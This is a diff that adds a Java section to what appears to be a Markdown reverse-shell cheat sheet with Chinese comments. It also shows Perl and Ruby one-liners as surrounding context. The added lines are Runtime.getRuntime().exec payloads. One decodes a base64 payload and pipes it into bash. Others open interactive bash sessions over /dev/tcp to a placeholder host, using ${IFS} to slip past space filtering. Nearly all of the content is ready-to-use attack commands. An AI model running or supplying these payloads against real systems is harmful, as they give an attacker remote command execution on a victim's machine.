@@ -94,6 +94,22 @@ perl -e 'use Socket;$i="127.0.0.1";$p=2333;socket(S,PF_INET,SOCK_STREAM,getproto
 ruby -rsocket -e'f=TCPSocket.open("127.0.0.1",233).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
 ```
 
+## Java
+
+java的shell需要一些奇怪的姿势
+
+``/bin/sh -c '$@|sh' xxx  echo ls`` -> `ls`
+
+
+
+```java
+Runtime.getRuntime().exec("bash -c {echo,<base64 payload>}|{base64,-d}|{bash,-i}");
+Runtime.getRuntime().exec("/bin/bash -c $@|bash 0 echo bash -i >&/dev/tcp/xx.xx.xx.xx/9999 0>&1");
+Runtime.getRuntime().exec("/bin/bash -c bash${IFS}-i${IFS}>&/dev/tcp/xx.xx.xx.xx/8888<&1");
+```
+
+
+
 ## Netcat
 
 ```bash
